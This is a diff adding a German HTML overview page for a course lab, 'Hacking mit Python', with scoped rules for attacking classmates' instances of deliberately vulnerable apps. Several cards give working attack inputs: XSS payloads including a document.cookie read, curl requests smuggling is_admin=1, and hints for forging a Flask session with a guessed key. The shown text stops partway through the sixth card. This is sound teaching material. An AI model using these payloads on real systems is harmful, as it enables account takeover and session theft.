@@ -1,0 +1,891 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Challenges &ndash; Hacking mit Python</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Rye&family=Special+Elite&display=swap" rel="stylesheet">
+<style>
+ :root{
+   --parch:#f4ecd8; --card:#fffbf0; --ink:#2b2119; --muted:#6b5b45;
+   --line:#d6c7a1; --leather:#92400e; --leather-d:#7c2d12; --accent:#b45309;
+   --code-bg:#efe3c4;
+ }
+ *{box-sizing:border-box}
+ body{margin:0;background:var(--parch);color:var(--ink);
+   font-family:"Special Elite","Courier New",monospace;line-height:1.55;
+   background-image:radial-gradient(circle at 20% 10%,rgba(146,64,14,.05),transparent 60%);}
+ .wrap{max-width:900px;margin:0 auto;padding:0 16px 4rem;}
+ header.hero{text-align:center;padding:2.4rem 1rem 1.4rem;}
+ h1{font-family:"Rye",serif;font-weight:400;font-size:clamp(1.8rem,6vw,3rem);
+   margin:.2rem 0;color:var(--leather-d);letter-spacing:.5px;}
+ .sub{color:var(--muted);margin:.2rem 0 0;}
+ .warn{background:var(--leather-d);color:#fde68a;padding:.7rem 1rem;border-radius:8px;
+   font-size:.92rem;margin:1.2rem auto;max-width:900px;}
+ .warn b{color:#fff;}
+ h2{font-family:"Rye",serif;font-weight:400;color:var(--leather-d);
+   font-size:1.4rem;margin:.1rem 0 .8rem;}
+ h4{font-family:"Rye",serif;font-weight:400;color:var(--accent);
+   font-size:1.02rem;margin:1.1rem 0 .3rem;}
+ table.overview{width:100%;border-collapse:collapse;background:var(--card);
+   border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:1.4rem 0 2.2rem;}
+ table.overview th,table.overview td{border-bottom:1px solid var(--line);
+   padding:.55rem .7rem;text-align:left;font-size:.92rem;}
+ table.overview th{background:#efe3c4;font-family:"Rye",serif;font-weight:400;}
+ table.overview tr:last-child td{border-bottom:0;}
+ td.num,.badge.num{font-variant-numeric:tabular-nums;color:var(--muted);}
+ a{color:var(--accent);text-decoration:none;}
+ a:hover{text-decoration:underline;}
+ .card{background:var(--card);border:1px solid var(--line);border-left:6px solid var(--leather);
+   border-radius:10px;padding:1.2rem 1.3rem;margin:1.4rem 0;
+   box-shadow:0 2px 0 rgba(0,0,0,.04);}
+ .meta{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:.3rem;}
+ .badge{font-size:.76rem;padding:.15rem .5rem;border-radius:999px;
+   border:1px solid var(--line);background:#fff;color:var(--muted);white-space:nowrap;}
+ .badge.owasp{background:#fef3c7;color:#92400e;border-color:#fcd34d;}
+ .badge.port{background:#ecfccb;color:#3f6212;border-color:#bef264;}
+ .badge.niv.p1{background:#dcfce7;color:#166534;}
+ .badge.niv.p2{background:#fef9c3;color:#854d0e;}
+ .badge.niv.p3{background:#ffedd5;color:#9a3412;}
+ .badge.niv.p4{background:#fee2e2;color:#991b1b;}
+ .pips{letter-spacing:1px;color:var(--accent);}
+ .body p{margin:.5rem 0;}
+ .body ul{margin:.4rem 0 .6rem;padding-left:1.3rem;}
+ .body li{margin:.2rem 0;}
+ code{background:var(--code-bg);padding:0 .25rem;border-radius:3px;
+   font-family:"Courier New",monospace;font-size:.9em;}
+ pre{background:#2b2119;color:#f4ecd8;padding:.8rem 1rem;border-radius:8px;
+   overflow:auto;font-size:.85rem;}
+ pre code{background:none;color:inherit;padding:0;}
+ blockquote{margin:.6rem 0;padding:.4rem .9rem;border-left:4px solid var(--line);
+   background:#faf4e4;color:var(--muted);border-radius:0 6px 6px 0;}
+ blockquote pre{margin:.3rem 0;}
+ hr.rule{border:0;border-top:1px dashed var(--line);margin:1rem 0;}
+ .folder{font-size:.85rem;color:var(--muted);border-top:1px dashed var(--line);
+   padding-top:.7rem;margin-top:1rem;}
+ .top{font-size:.8rem;margin:.3rem 0 0;}
+ footer{text-align:center;color:var(--muted);font-size:.82rem;margin-top:2.5rem;}
+ @media (prefers-color-scheme: dark){
+   :root:not([data-theme="light"]){
+     --parch:#1c1813; --card:#241f18; --ink:#ece3cf; --muted:#b3a384;
+     --line:#4a3f2c; --code-bg:#3a3122;
+   }
+   :root:not([data-theme="light"]) table.overview th{background:#2f2819;}
+   :root:not([data-theme="light"]) blockquote{background:#2a241a;}
+   :root:not([data-theme="light"]) .badge{background:#2f2819;}
+ }
+</style>
+</head>
+<body>
+<a id="top"></a>
+<div class="wrap">
+  <header class="hero">
+    <h1>&#129312; Challenges</h1>
+    <p class="sub">Kapere die Seite &ndash; 12 verwundbare Mini-Ziele aus dem Kurs
+       &bdquo;Hacking mit Python&ldquo;</p>
+  </header>
+
+  <div class="warn">
+    <b>Grenze:</b> Nur gegen die <b>eigene</b> oder eine ausdr&uuml;cklich freigegebene
+    Instanz im Kurs-Netz. Keine fremden/&ouml;ffentlichen Systeme. Payloads harmlos halten
+    (<code>alert</code>, <code>whoami</code>), kein DoS, keine echten Daten abflie&szlig;en
+    lassen. Nur w&auml;hrend der &Uuml;bungstermine.
+  </div>
+
+  <table class="overview">
+    <thead><tr><th>#</th><th>Challenge</th><th>OWASP</th><th>Port</th><th>Niveau</th></tr></thead>
+    <tbody>
+      <tr>
+        <td class="num">01</td>
+        <td><a href="#challenge_mass_assignment">Mass Assignment</a></td>
+        <td>A01 Broken Access Control</td>
+        <td><code>:5005</code></td>
+        <td><span class="pips p1" title="leicht">★☆☆☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">02</td>
+        <td><a href="#challenge_stored_xss">Stored XSS</a></td>
+        <td>A03 Injection</td>
+        <td><code>:5002</code></td>
+        <td><span class="pips p2" title="leicht–mittel">★★☆☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">03</td>
+        <td><a href="#challenge_business_logic">Business-Logic-Fehler</a></td>
+        <td>A04 Insecure Design</td>
+        <td><code>:5009</code></td>
+        <td><span class="pips p2" title="leicht–mittel">★★☆☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">04</td>
+        <td><a href="#challenge_race_condition">Race Condition (TOCTOU)</a></td>
+        <td>A04 Insecure Design</td>
+        <td><code>:5008</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">05</td>
+        <td><a href="#challenge_session_forgery">Session-Fälschung</a></td>
+        <td>A02 Cryptographic Failures</td>
+        <td><code>:5001</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">06</td>
+        <td><a href="#challenge_session_puppetry">Session-Abuse</a></td>
+        <td>A01 Broken Access Control</td>
+        <td><code>:5007</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">07</td>
+        <td><a href="#challenge_password_reset">Schwaches Reset-Token</a></td>
+        <td>A07 Auth Failures</td>
+        <td><code>:5010</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">08</td>
+        <td><a href="#challenge_file_upload">Unrestricted File Upload</a></td>
+        <td>A04/A05</td>
+        <td><code>:5006</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">09</td>
+        <td><a href="#challenge_jwt">JWT-Fälschung</a></td>
+        <td>A02/A07</td>
+        <td><code>:5004</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">10</td>
+        <td><a href="#challenge_ssrf">Server-Side Request Forgery</a></td>
+        <td>A10 SSRF</td>
+        <td><code>:5011</code></td>
+        <td><span class="pips p3" title="mittel">★★★☆</span></td>
+      </tr>
+      <tr>
+        <td class="num">11</td>
+        <td><a href="#challenge_ssti">SSTI → RCE</a></td>
+        <td>A03 Injection</td>
+        <td><code>:5003</code></td>
+        <td><span class="pips p4" title="mittel–schwer">★★★★</span></td>
+      </tr>
+      <tr>
+        <td class="num">12</td>
+        <td><a href="#challenge_pickle">Insecure Deserialization</a></td>
+        <td>A08 Integrity Failures</td>
+        <td><code>:5012</code></td>
+        <td><span class="pips p4" title="mittel–schwer">★★★★</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <article class="card" id="challenge_mass_assignment">
+    <div class="meta">
+      <span class="badge num">#01</span>
+      <span class="badge owasp">A01 Broken Access Control</span>
+      <span class="badge port">Port :5005</span>
+      <span class="badge niv p1">leicht</span>
+    </div>
+    <h2>Mass Assignment</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass ein Formular mehr Felder entgegennehmen kann, als es anzeigt. Beim Registrieren schmuggelt ihr ein zusätzliches Feld mit und werdet dadurch <strong>Administrator</strong> — obwohl das Formular gar keinen „Admin"-Haken hat.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5005</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Nur fiktive Konten. Kein DoS, keine Fremddaten.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Die Registrierung zeigt nur <strong>Benutzername</strong> und <strong>Passwort</strong>. Intern hat ein Konto aber auch ein Feld <code>is_admin</code> (Standard: <code>false</code>). Der Admin-Bereich (<code>/admin</code>) ist nur für Konten mit <code>is_admin = true</code>.</p>
+<h4>Aufgabe</h4>
+<p>Lege ein Konto an, das <strong>sofort Admin</strong> ist, und öffne <code>/admin</code> — ohne dass das Formular eine Admin-Option anbietet.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Der Server übernimmt <strong>alle</strong> gesendeten Formularfelder ins Konto, nicht nur die
+ angezeigten. Was, wenn du ein <strong>zusätzliches</strong> Feld <code>is_admin</code> mitschickst?
+</li>
+<li>Du musst dafür das Formular „erweitern". Zwei einfache Wege:
+<ul>
+<li><strong>Browser-DevTools:</strong> Im Registrier-Formular ein Feld hinzufügen:
+<pre><code class="lang-html">    &lt;input name=&quot;is_admin&quot; value=&quot;1&quot;&gt;</code></pre>
+ (F12 → Elements → ins <code>&lt;form&gt;</code> einfügen), dann absenden.
+</li>
+<li><strong>Request direkt bauen:</strong>
+<pre><code class="lang-bash">    curl -i -c cj.txt -d &quot;username=evil&amp;password=x&amp;is_admin=1&quot; http://ZIEL:5005/
+    curl -b cj.txt http://ZIEL:5005/admin</code></pre>
+</li></ul>
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Dein frisch registriertes Konto erreicht <code>/admin</code> („… ist Administrator").
+</li>
+<li>Du hast dafür nur ein extra Formularfeld mitgeschickt, kein Admin-Konto gekapert.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Ein bereits vorhandenes Admin-Konto übernehmen.
+</li>
+<li><code>/admin</code> ohne gültiges, als Admin markiertes Konto aufrufen.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_mass_assignment/"><code>challenge_mass_assignment/</code></a>
+       &middot; Start: <code>cd challenge_mass_assignment &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_stored_xss">
+    <div class="meta">
+      <span class="badge num">#02</span>
+      <span class="badge owasp">A03 Injection</span>
+      <span class="badge port">Port :5002</span>
+      <span class="badge niv p2">leicht–mittel</span>
+    </div>
+    <h2>Stored XSS</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass ein Eingabefeld gefährlich wird, wenn sein Inhalt später <strong>ungeescaped</strong> wieder angezeigt wird. Ihr schmuggelt über die <strong>Beschreibung</strong> eines Tickets JavaScript ein, das bei <strong>allen</strong> losläuft, die das Ticket danach öffnen (<strong>Stored / Persistent XSS</strong>).</p>
+<p><strong>Aufbau:</strong> Jede:r startet die verwundbare App auf dem <strong>eigenen</strong> Rechner. Der/ die <strong>Nachbar:in</strong> legt auf eurer Instanz ein Ticket mit einem Payload an; sobald ihr (oder „die Sachbearbeitung") das Ticket anschaut, läuft fremder Code in eurem Browser.</p>
+<blockquote><p>Lokal starten und im Kurs-Netz erreichbar machen:</p>
+<pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5002</code></pre>
+<p>(Standard ist <code>127.0.0.1</code> = nur lokal. <code>0.0.0.0</code> nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)</p></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Greift <strong>ausschließlich</strong> die Instanz an, deren Besitzer:in euch ausdrücklich
+ dazu eingeladen hat (euer:e direkte:r Nachbar:in). Keine anderen Rechner/Dienste.
+</li>
+<li>Nur fiktive Konten/Inhalte. Keine echten Namen, Passwörter oder
+ personenbezogenen Daten. Legt keine Massen an Tickets an.
+</li>
+<li>Kein Denial-of-Service, kein Verändern/Löschen fremder Daten. Die Challenge ist
+ mit <strong>einem</strong> präparierten Ticket lösbar.
+</li>
+<li>Haltet den Payload harmlos (<code>alert</code>); keine echten Schad-Skripte, kein
+ Weiterleiten von Daten an externe Server.
+</li>
+<li>Nur während des vorgesehenen Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Das Ticketsystem zeigt die <strong>Beschreibung</strong> eines Tickets auf der Detailseite an und schreibt sie beim Bearbeiten zurück ins Formular. Du kannst Tickets anlegen und ansehen.</p>
+<h4>Aufgabe</h4>
+<p>Lege ein Ticket an, dessen <strong>Beschreibung</strong> so präpariert ist, dass beim <strong>Öffnen des Tickets</strong> JavaScript ausgeführt wird — sichtbar durch ein <code>alert('XSS')</code>.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Nicht das Eingabefeld ist entscheidend, sondern **wo die Beschreibung wieder
+ ausgegeben wird<strong>. Schau dir den Quelltext der Ticket-</strong>Detailseite** an
+ (Rechtsklick → Seitenquelltext / F12 → Elements) und suche deinen Text.
+</li>
+<li>Steht er dort <strong>roh</strong> (<code>&lt;img …&gt;</code> statt <code>&amp;lt;img …&amp;gt;</code>), wird nicht escaped →
+ dein HTML wird Teil der Seite.
+</li>
+<li>Ein Payload, der <strong>beim Laden</strong> feuert, ist zuverlässiger als einer, der auf
+ einen Fehler wartet:
+<pre><code class="lang-html">  &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code></pre>
+</li>
+<li>Achte auf den <strong>Kontext</strong>: Auf der Detailseite landet die Beschreibung in einem
+ normalen Absatz (<code>&lt;p&gt;</code>) — da reicht der Payload direkt. Im <strong>Bearbeiten</strong>-
+ Formular steht sie in einem <code>&lt;textarea&gt;</code>; dort musst du es erst schließen:
+<pre><code class="lang-html">  &lt;/textarea&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code></pre>
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Du hast <strong>ein</strong> Ticket mit präparierter Beschreibung gespeichert.
+</li>
+<li>Beim <strong>Öffnen dieses Tickets</strong> erscheint ein <code>alert('XSS')</code> — ohne dass du
+ sonst etwas anklickst.
+</li>
+<li>Der Payload steht im Seitenquelltext <strong>roh</strong> (nicht escaped).
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Den Payload nur ins Formular tippen und im <code>&lt;textarea&gt;</code> „sehen" (dort ist er
+ als Formular-Wert escaped — das ist normal und keine Lücke).
+</li>
+<li><code>alert</code> über die Browser-Konsole selbst auslösen.
+</li>
+<li>Die Seite lokal im Editor verändern (DevTools-DOM-Edit) — es muss aus den
+ <strong>gespeicherten</strong> Ticketdaten kommen.
+</li></ul>
+<h4>Kür (Impact zeigen)</h4>
+<p>Dieses System legt die Identität in einem <strong>Klartext-Cookie</strong> <code>username</code> <strong>ohne HttpOnly</strong> ab. Damit lässt sich der Cookie per XSS auslesen:</p>
+<pre><code class="lang-html">&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+<p>Zeigt der Alert <code>username=…</code>, könnte ein echter Angreifer die Identität stehlen/übernehmen. (Deshalb: <code>HttpOnly</code> setzen.)</p>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_stored_xss/"><code>challenge_stored_xss/</code></a>
+       &middot; Start: <code>cd challenge_stored_xss &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_business_logic">
+    <div class="meta">
+      <span class="badge num">#03</span>
+      <span class="badge owasp">A04 Insecure Design</span>
+      <span class="badge port">Port :5009</span>
+      <span class="badge niv p2">leicht–mittel</span>
+    </div>
+    <h2>Business-Logic-Fehler</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass nicht nur Injection gefährlich ist — auch eine fehlende <strong>Plausibilitätsprüfung</strong> in der Geschäftslogik. Ihr kauft mit 50 Gold einen Sheriffstern, der 500 kostet.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5009</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Kein DoS, keine Fremddaten.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Im Kramladen gibt es Whiskey (5), Bohnen (2), Hufeisen (12) und den begehrten <strong>Sheriffstern (500)</strong>. Du startest mit <strong>50 Gold</strong>. Der Laden prüft vor dem Kauf, ob du dir die Bestellung leisten kannst.</p>
+<h4>Aufgabe</h4>
+<p>Besitze einen Sheriffstern.</p>
+<h4>Hinweise</h4>
+<ul>
+<li>Das Mengenfeld hat <code>min="0"</code> — aber das ist nur <strong>HTML</strong>. Wer prüft das auf
+ dem Server?
+</li>
+<li>Rechne nach: Was ergibt <code>500 <em> 1 + 5 </em> (-100)</code>?
+</li>
+<li>DevTools (Attribut <code>min</code> löschen) oder direkt per <code>curl</code> / <code>requests</code>.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Der Laden zeigt „Angriff geglückt" und den Stern im Inventar.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Cookie eines anderen Kunden übernehmen, Server-Variablen direkt ändern.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_business_logic/"><code>challenge_business_logic/</code></a>
+       &middot; Start: <code>cd challenge_business_logic &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_race_condition">
+    <div class="meta">
+      <span class="badge num">#04</span>
+      <span class="badge owasp">A04 Insecure Design</span>
+      <span class="badge port">Port :5008</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Race Condition (TOCTOU)</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass „erst prüfen, dann abbuchen" nicht reicht, wenn mehrere Anfragen <strong>gleichzeitig</strong> ankommen. Ihr hebt von einem Konto mit 100 Gold mehr als 100 Gold ab.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5008</code></pre></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz. Kein DoS: <strong>höchstens ~20 parallele Requests</strong>.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Die Goldbank gibt jedem Besucher ein Konto mit <strong>100 Gold</strong>. Am Schalter kann man abheben — das Gold wandert in die Satteltasche. Die Bank prüft brav, ob genug auf dem Konto liegt. Die Buchung dauert aber einen Moment …</p>
+<h4>Aufgabe</h4>
+<p>Bring <strong>mehr als 100 Gold</strong> in deine Satteltasche.</p>
+<h4>Hinweise</h4>
+<ul>
+<li>Zwei Klicks hintereinander reichen nicht — der zweite kommt zu spät.
+</li>
+<li>Dein Konto hängt am Cookie <code>spieler</code>. Alle Anfragen müssen ihn mitschicken.
+</li>
+<li>Python-Threads (<code>threading</code> oder <code>concurrent.futures</code>) + <code>requests</code> schicken
+ mehrere POSTs auf <code>/abheben</code> praktisch gleichzeitig.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Die Startseite zeigt „Angriff geglückt" mit Satteltasche &gt; 100.
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Negative Beträge o. ä. (werden abgelehnt), mehrere Konten zusammenlegen.
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="challenge_race_condition/"><code>challenge_race_condition/</code></a>
+       &middot; Start: <code>cd challenge_race_condition &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_session_forgery">
+    <div class="meta">
+      <span class="badge num">#05</span>
+      <span class="badge owasp">A02 Cryptographic Failures</span>
+      <span class="badge port">Port :5001</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Session-Fälschung</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass eine „Login-Pflicht" nichts wert ist, wenn der Session-Cookie nur <strong>signiert</strong> (nicht verschlüsselt) ist und mit einem <strong>schwachen, bekannten <code>SECRET_KEY</code></strong> abgesichert wurde.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die verwundbare Übungs-App <code>target_session_forgery.py</code> auf dem <strong>eigenen</strong> Rechner. Der/die <strong>Nachbar:in</strong> greift genau diese eine Instanz an. Ihr tauscht dafür nur die URL eurer Instanz aus (z. B. <code>http://192.168.x.y:5001</code>).</p>
+<blockquote><p>Lokal starten und im Kurs-Netz erreichbar machen:</p>
+<pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py</code></pre>
+<p>(Standard ist <code>127.0.0.1</code> = nur lokal. <code>0.0.0.0</code> nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)</p></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Greift <strong>ausschließlich</strong> die Instanz an, deren Besitzer:in euch dazu
+ ausdrücklich eingeladen hat (euer:e direkte:r Nachbar:in). Keine anderen
+ Rechner, Ports oder Dienste.
+</li>
+<li>Nur die vorgesehenen fiktiven Konten verwenden. Keine echten Namen,
+ Passwörter oder personenbezogenen Daten.
+</li>
+<li>Keine Denial-of-Service-Versuche, kein Löschen/Verändern von Daten, keine
+ Massen-Requests. Die Challenge ist mit **einem einzigen, von Hand gebauten
+ Cookie** lösbar.
+</li>
+<li>Nur während des dafür vorgesehenen Übungstermins.
+</li>
+<li>Dokumentiert euren Lösungsweg kurz (welchen Cookie habt ihr gebaut, warum hat
+ er funktioniert).
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Auf der Zielinstanz gibt es ein Konto <code>admin</code> mit einem <strong>unbekannten, zufälligen Passwort</strong> — über das Login-Formular kommt ihr dort also nicht rein. Das Dashboard (<code>/dashboard</code>) verlangt einen Login und leitet euch ohne gültige Session auf <code>/login</code> um.</p>
+<p>Ihr kennt kein <code>admin</code>-Passwort, und ein Session-Cookie bekommt ihr regulär nur nach erfolgreichem Login.</p>
+<h4>Aufgabe</h4>
+<p>Bringt die Zielseite dazu, euch als <strong><code>admin</code></strong> zu erkennen — das Dashboard soll „Willkommen zurück, <strong>admin</strong>" anzeigen —, <strong>ohne</strong> das Passwort von <code>admin</code> zu kennen oder zu verwenden.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Der Server legt eure Identität in einem Cookie namens <code>session</code> ab. Schaut ihn
+ euch an (<code>curl -i</code> oder die Entwickler-Tools): Er ist <strong>base64-lesbar</strong>, aber
+ am Ende steht eine <strong>Signatur</strong>. Verändert man den Inhalt, passt die Signatur
+ nicht mehr — der Server weist den Cookie ab.
+</li>
+<li>Flask <strong>verschlüsselt</strong> die Session nicht, es <strong>signiert</strong> sie nur
+ (HMAC, salt <code>cookie-session</code>). Wer den <code>SECRET_KEY</code> kennt, kann einen
+ <strong>beliebigen Inhalt selbst gültig signieren</strong>.
+</li>
+<li>Dieser Key ist hier nicht zufällig, sondern ein **schwacher, „geratener"
+ Standardwert**. Probiert eine kleine Liste naheliegender Keys durch
+ (Projektname, <code>secret</code>, <code>changeme</code>, … — und denkt an das Thema des Labs 😉).
+</li>
+<li>Habt ihr den Key, baut einen Cookie mit dem Payload <code>{"user": "admin"}</code> und
+ setzt ihn, bevor ihr <code>/dashboard</code> aufruft.
+</li></ul>
+<h4>Erfolgskriterium</h4>
+<ul>
+<li>Ihr habt <strong>keinen</strong> gültigen Login durchgeführt und kein <code>admin</code>-Passwort
+ verwendet.
+</li>
+<li>Ihr habt einen <strong>selbst gebauten, gültig signierten</strong> <code>session</code>-Cookie gesetzt.
+</li>
+<li>Das Dashboard zeigt euch als <code>admin</code> eingeloggt
+ (inkl. Hinweis „Angriff geglückt").
+</li></ul>
+<h4>Zählt <strong>nicht</strong> als Lösung</h4>
+<ul>
+<li>Euch mit dem Testkonto <code>team-test</code> / <code>test123</code> regulär einloggen.
+</li>
+<li>Das <code>admin</code>-Passwort erraten/bruteforcen (ist zufällig, nicht vorgesehen).
+</li>
+<li>Den Cookie-Inhalt einfach ändern, <strong>ohne</strong> neu zu signieren (der Server lehnt
+ ihn ab — genau das ist der Punkt).
+</li></ul>
+    </div>
+    <p class="folder">Ordner: <a href="../challenge_session_forgery/"><code>../challenge_session_forgery/</code></a>
+       &middot; Start: <code>cd ../challenge_session_forgery &amp;&amp; python app.py</code></p>
+    <p class="top"><a href="#top">&uarr; nach oben</a></p>
+  </article>
+  <article class="card" id="challenge_session_puppetry">
+    <div class="meta">
+      <span class="badge num">#06</span>
+      <span class="badge owasp">A01 Broken Access Control</span>
+      <span class="badge port">Port :5007</span>
+      <span class="badge niv p3">mittel</span>
+    </div>
+    <h2>Session-Abuse</h2>
+    <div class="body">
+<p>Ziel dieser Übung: Zeigt, dass eine Flask-<strong>Session</strong> gefährlich wird, wenn die App <strong>Nutzereingaben ungefiltert in die Session übernimmt</strong>. Du beförderst dich selbst vom „Greenhorn" zum <strong>Marshal</strong> und kommst so ins Admin-Büro — <strong>ohne</strong> den <code>SECRET_KEY</code> zu kennen und ohne Marshal-Zugangsdaten.</p>
+<p><strong>Aufbau:</strong> Jede:r startet die App auf dem <strong>eigenen</strong> Rechner; der/die <strong>Nachbar:in</strong> greift diese Instanz an.</p>
+<blockquote><pre><code class="lang-powershell">$env:HOST = &quot;0.0.0.0&quot;; python app.py        # http://&lt;deine-ip&gt;:5007</code></pre>
+<p>(Standard ist <code>127.0.0.1</code> = nur lokal. <code>0.0.0.0</code> nur im vertrauenswürdigen Kurs-Netz während des Übungstermins.)</p></blockquote>
+<hr class="rule">
+<h4>Spielregeln</h4>
+<ul>
+<li>Nur die eingeladene Instanz (euer:e direkte:r Nachbar:in). Keine anderen Rechner.
+</li>
+<li>Nur das fiktive Konto <code>team-test</code> / <code>test123</code>. Keine echten Daten.
+</li>
+<li>Kein DoS, kein Verändern/Löschen fremder Daten. Mit <strong>einem</strong> Request lösbar.
+</li>
+<li>Nur während des Übungstermins. Lösungsweg kurz dokumentieren.
+</li></ul>
+<hr class="rule">
+<h4>Szenario</h4>
+<p>Nach dem Login bist du ein <strong>Greenhorn</strong> (<code>rang=greenhorn</code>). Das <strong>Marshal-Büro</strong> (<code>/marshal</code>) steht nur dem Rang <code>marshal</code> offen. Es gibt eine Seite <strong>Einstellungen</strong>, auf der du eigentlich nur deinen Anzeigenamen und deinen Lieblings-Revolver speicherst.</p>
+<p>Der Haken: Das <code>SECRET_KEY</code> ist hier <strong>stark und zufällig</strong> — den Cookie selbst zu fälschen, ist also aussichtslos. Trotzdem gibt es einen Weg.</p>
+<h4>Aufgabe</h4>
+<p>Erreiche <code>/marshal</code> als Marshal (<code>rang=marshal</code>), ohne einen Marshal-Login zu kennen und ohne den <code>SECRET_KEY</code>.</p>
+<h4>Hinweis</h4>
+<ul>
+<li>Schau dir an, <strong>was</strong> die Einstellungen-Route mit den Formulardaten macht. Sie
+ übernimmt <strong>jedes</strong> gesendete Feld in die Session — auch Felder, die im Formular
+ gar nicht vorgesehen sind.
+</li>
+<li>Die Startseite zeigt dir den kompletten <strong>Session-Inhalt</strong> an. Beobachte, wie er
+ sich nach dem Speichern verändert.
+</li>
+<li>Du musst nichts signieren/fälschen: Schick einfach ein zusätzliches Feld <code>rang</code>
+ mit — der <strong>Server</strong> packt es in die Session und signiert sie für dich.
+</li>
+<li>Im Browser: Einstellungen öffnen, per DevTools (F12 → Elements) ein weiteres
+ Feld ins Formular einfügen …
+<pre><code class="lang-html">  &lt;input name=&quot;rang&quot; value=&quot;marshal&quot;&gt;</code></pre>
+ … oder gleich per <code>curl</code> ein Feld mehr mitschicken.
+</li></ul>
